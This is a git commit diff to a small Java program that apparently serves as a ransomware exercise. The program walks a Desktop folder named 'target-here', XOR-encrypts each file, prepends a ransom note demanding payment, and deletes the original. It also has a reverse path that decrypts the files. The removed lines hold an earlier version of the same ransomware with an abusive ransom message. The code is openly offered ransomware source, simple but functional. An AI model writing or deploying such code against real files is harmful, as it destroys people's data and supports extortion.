c68593228afe82b80cfd3bfb6072283b25146687
Ranjith Suranga <d.m.ranjith.sura@gmail.com>
2022-08-09 16:27:29 +0530

    Add encryption and decryption logic

--- src/main/java/AppInitializer.java
+++ src/main/java/AppInitializer.java
@@ -2,75 +2,51 @@ import java.io.*;
 
 public class AppInitializer {
 
-    private static String signature = "You bastard!, your file has been encrypted, you have to pay now!";
+    private static final String signature = "================================\n" +
+            "Your file has been encrypted. You have to pay us to decrypt\n" +
+            "===========================================";
 
     public static void main(String[] args) throws IOException {
-        File targetDir = new File(new File(System.getProperty("user.home"), "Desktop"), "target-here");
+        File targetDir = new File(new File(System.getProperty("user.home"), "Desktop"),
+                "target-here");
         File[] files = targetDir.listFiles();
         for (File file : files) {
             if (!file.isDirectory()) {
-                decryptFile(file);
+                encryptFile(file, false);
             }
         }
     }
 
-    public static void decryptFile(File file) throws IOException {
-        File decryptedFile = new File(file.getParent(), file.getName().replace(".encrypted", ""));
+    private static void encryptFile(File file, boolean encrypt) throws IOException {
+        File encryptedFile = new File(file.getParent(),
+                encrypt ? file.getName() + ".encrypted" :
+                        file.getName().replace(".encrypted", ""));
+        if (encryptedFile.exists()) return;
 
-        if (!decryptedFile.exists()) {
-            decryptedFile.createNewFile();
-            FileInputStream fis = new FileInputStream(file);
-            BufferedInputStream bis = new BufferedInputStream(fis);
-            FileOutputStream fos = new FileOutputStream(decryptedFile);
-            BufferedOutputStream bos = new BufferedOutputStream(fos);
+        encryptedFile.createNewFile();
 
-            byte[] bytes = signature.getBytes();
-            bis.read(bytes);
+        BufferedInputStream bis = new BufferedInputStream(new FileInputStream(file));
+        BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(encryptedFile));
 
-            while (true) {
-                byte[] buffer = new byte[1024 * 10];
-                int read = bis.read(buffer);
-                if (read == -1) break;
-                for (int i = 0; i < read; i++) {
-                    buffer[i] = (byte) (buffer[i] - 1);
-                }
-                bos.write(buffer, 0, read);
-            }
-
-            bos.close();
-            bis.close();
-
-            file.delete();
+        if (encrypt){
+            bos.write(signature.getBytes());
+        }else{
+            bis.skip(signature.getBytes().length);
         }
+
+        while (true) {
+            byte[] buffer = new byte[1024 * 10];
+            int read = bis.read(buffer);
+            if (read == -1) break;
+            for (int i = 0; i < read; i++) {
+                buffer[i] = (byte) (buffer[i] ^ 0xFF);
+            }
+            bos.write(buffer, 0, read);
+        }
+
+        bis.close();
+        bos.close();
+        file.delete();
     }
 
-    public static void encryptFile(File file) throws IOException {
-        File encryptedFile = new File(file.getParent(), file.getName() + ".encrypted");
-
-        if (!encryptedFile.exists()) {
-            encryptedFile.createNewFile();
-            FileInputStream fis = new FileInputStream(file);
-            BufferedInputStream bis = new BufferedInputStream(fis);
-            FileOutputStream fos = new FileOutputStream(encryptedFile);
-            BufferedOutputStream bos = new BufferedOutputStream(fos);
-
-            byte[] bytes = signature.getBytes();
-            bos.write(bytes);
-
-            while (true) {
-                byte[] buffer = new byte[1024 * 10];
-                int read = bis.read(buffer);
-                if (read == -1) break;
-                for (int i = 0; i < read; i++) {
-                    buffer[i] = (byte) (buffer[i] + 1);
-                }
-                bos.write(buffer, 0, read);
-            }
-
-            bos.close();
-            bis.close();
-
-            file.delete();
-        }
-    }
 }
